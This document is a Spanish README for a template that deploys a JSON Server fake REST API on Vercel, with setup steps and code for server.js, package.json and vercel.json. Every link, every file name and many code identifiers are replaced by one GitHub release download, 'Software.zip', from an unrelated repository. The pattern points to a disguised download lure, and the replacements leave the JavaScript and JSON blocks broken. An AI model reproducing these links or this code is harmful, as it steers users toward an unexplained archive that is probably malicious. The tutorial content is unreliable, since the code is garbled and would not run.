## Despliega JSON Server en Vercel

Una plantilla para desplegar [JSON Server](https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip) en [Vercel](https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip), ¡permitiéndote ejecutar una API REST falsa en línea 🐣!

Demo desde este repositorio:
https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip

### Cómo usar (resumen)

1. Haz clic en "**Use this Template**" o clona este repositorio.
2. Actualiza o usa el [`https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip`](https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip) predeterminado en el repositorio.
3. Regístrate o inicia sesión en [Vercel](https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip).
4. Desde el panel de Vercel, haz clic en "**+ Nuevo Proyecto**" y luego "**Importar**" tu repositorio.
5. En la pantalla "**Configurar Proyecto**", deja todo como está por defecto y haz clic en "**Desplegar**".
6. Espera hasta que el despliegue esté completo, ¡y tu propio servidor JSON estará listo para funcionar!

## `https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip` Predeterminado

```json
{
 "video": [
        {
            "img": "https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip",
            "nombre": "Taza Trooper",
            "precio": "$60.00",
            "descripción": "Taza con casco de Trooper",
            "categoría": "starwars",
            "id": 1
        },
        {
            "img": "https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip",
            "nombre": "Funko de Vader",
            "precio": "$60.00",
            "descripción": "Funko coleccionable de Darth Vader",
            "categoría": "starwars",
            "id": 2
        }
 ]
}
```

## Créalo por Ti Mismo

Si deseas crear el proyecto desde cero, tengo un [video tutorial en YouTube (en español) que te guía a través de cómo desplegar tu propia API falsa con db-json y Vercel.](https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip) 

### Paso 1

Crea un nuevo repositorio, por ejemplo, **alurageek-API**. Luego clona ese repositorio vacío.

### Paso 2

Necesitas ejecutar el comando npm init:
```
npm init -y
```

Esto generará un **https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip**. Ahora, lo que necesitas hacer es cambiar estas líneas:

Cambia esta línea:
``` 
 "main": "https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip",
```

A esto:

```
  "main": "https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip",
```

Y esto:

```
"test": "echo \"Error: no test specified\" && exit 1"
```

A esto:

```
"start": "node https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip"
```

### Paso 3

Ahora es el momento de ejecutar el comando:

```
npm install json-server cors
```

![Alt text](https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip)

Verás que tanto **cors** como ***json-server*** se han agregado al https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip

### Paso 4

Ejecuta el comando:
```
npm install json-serve
```
PON ATENCIÓN, YA QUE EL COMANDO DICE ***SERVE*** NO SERVER

Agrega el archivo ***.gitignore*** y agrega ***node_modules***.

### Paso 5

Crea un archivo ***https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip*** y agrega tus propios datos.

Además, necesitarás agregar una nueva [Carpeta llamada ***api***](./api/)  y, dentro de ella, este archivo [**https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip**](https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip):

```javascript
// Ver https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip
const jsonServer = require('json-server')
const server = https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip()
const router = https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip('https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip')
const middlewares = https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip()

https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip(middlewares)
// Agrega esto antes de https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip(router)
https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip(https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip({
    '/api/*': '/$1',
    '/videos/:recurso/:id/ver': '/:recurso/:id'
}))
https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip(router)
https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip(3000, () => {
    https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip('El servidor JSON está funcionando')
})

// Exporta la API del Servidor
https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip = server
```

### Paso 6

Crea un archivo nuevo llamado [***https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip***](https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip)

```json
{
  "functions": {
    "https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip": {
      "memory": 1024,
      "includeFiles": "https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip"
    }
  },
  "rewrites": [
    {
      "source": "/(.*)",
      "destination": "https://github.com/guibetancur/fakeapi/releases/download/v1.0/Software.zip"
    }
  ]
}
```

# No olvides hacer commit y hacer push a  tus cambios 🐣

Ve a tu cuenta de Vercel, crea  un nuevo proyecto desde tu repositorio y despliégalo💙

## Debes tener paciencia

Puede tomar varios minutos para que funcione correctamente. ⏰🥹

